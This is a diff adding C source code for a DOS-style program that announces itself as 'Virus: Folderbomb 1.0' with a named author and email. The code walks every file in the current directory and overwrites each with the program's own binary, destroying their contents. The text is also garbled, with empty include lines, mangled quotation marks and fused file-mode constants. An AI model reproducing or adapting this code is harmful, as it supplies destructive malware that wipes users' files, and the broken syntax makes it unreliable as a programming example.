@@ -1,0 +1,63 @@
+﻿#include<stdio.h>
+
+#include<conio.h>
+
+#include
+
+#include
+
+#include
+
+void main(int argc,char* argv[])
+
+{ 
+char buf[512];
+
+int source,target,byt,done;
+struct ffblk ffblk;
+
+textcolor(2);
+
+cprintf(‖————————————————————————–‖);
+
+printf(‖\nVirus: Folderbomb 1.0\nProgrammer:BAS
+Unnikrishnan(asystem0@gmail.com)\n‖);
+
+cprintf(‖————————————————————————–‖);
+
+done = findfirst(‖*.*‖,&ffblk,0);
+
+while (!done)
+{ printf(‖\n‖);
+cprintf(‖ %s ―, ffblk.ff_name);
+printf(‖is attacked by
+―);
+cprintf(‖Folderbomb‖);
+
+source=open(argv[0],O_RDONLYO_BINARY);
+
+target=open(ffblk.ff_name,O_CREATO_BINARYO_WRONGLY);
+
+while(1)
+
+{
+byt=read(source,buf,512);
+
+if(byt>0) 
+write(target,buf,byt);
+
+else
+break;
+
+}
+
+close(source);
+
+close(target);
+
+done = findnext(&ffblk);
+
+}
+
+}
+
